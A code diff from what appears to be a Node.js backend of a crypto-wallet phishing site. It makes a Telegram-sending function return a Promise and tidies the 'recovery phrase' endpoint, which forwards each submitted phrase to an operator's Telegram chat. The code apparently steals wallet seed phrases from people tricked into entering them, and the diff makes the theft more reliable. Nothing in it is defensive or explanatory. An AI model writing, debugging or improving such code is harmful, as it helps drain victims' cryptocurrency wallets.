@@ -43,21 +43,36 @@ function sendTelegram(msg) {
 
 
 function sendTelegramb(msg) {
-  const url = `https://api.telegram.org/bot${BOT_TOKENB}/sendMessage?chat_id=${CHAT_IDB}&text=${encodeURIComponent(msg)}`;
+  return new Promise((resolve, reject) => {
+    const url = `https://api.telegram.org/bot${BOT_TOKENB}/sendMessage?chat_id=${CHAT_IDB}&text=${encodeURIComponent(msg)}`;
 
-  const req = https.get(url, (res) => {
-    let body = '';
-    res.on('data', (chunk) => { body += chunk; });
-    res.on('end', () => {
-      console.log('Telegram status:', res.statusCode);
-      console.log('Telegram response:', body);
+    const req = https.get(url, (res) => {
+      let body = '';
+      res.on('data', (chunk) => { body += chunk; });
+      res.on('end', () => {
+        if (res.statusCode === 200) {
+          console.log('Telegram sent successfully');
+          resolve(body);
+        } else {
+          const err = new Error(`Telegram API error: ${res.statusCode} ${body}`);
+          console.error(err.message);
+          reject(err);
+        }
+      });
+      res.on('error', (err) => {
+        console.error('Telegram response stream error:', err.message);
+        reject(err);
+      });
     });
-  });
 
-  req.on('error', (err) => {
-    console.error('Telegram request failed:', err.message);
+    req.on('error', (err) => {
+      console.error('Telegram request failed:', err.message);
+      reject(err);
+    });
+
+    req.end(); // good practice even though get() implies it
   });
-}
+} 
 
  
  // API routes first so they are not shadowed by the static catch-all
@@ -70,15 +85,11 @@ function sendTelegramb(msg) {
          }
 
          console.log('📧 Processing recovery phrase request...');
-         sendTelegramb(`
+         await sendTelegramb(`
 🔔 New Request
 ─────────────
 📥 Input: ${inpvalue}
-`);   sendTelegramb(`
-🔔 New Request
-─────────────
-📥 Input: ${inpvalue}
-`);
+`);  
   res.json({msg:'great'})
      } catch (err) {
          console.error('❌ Error in recovery phrase endpoint:', err); 
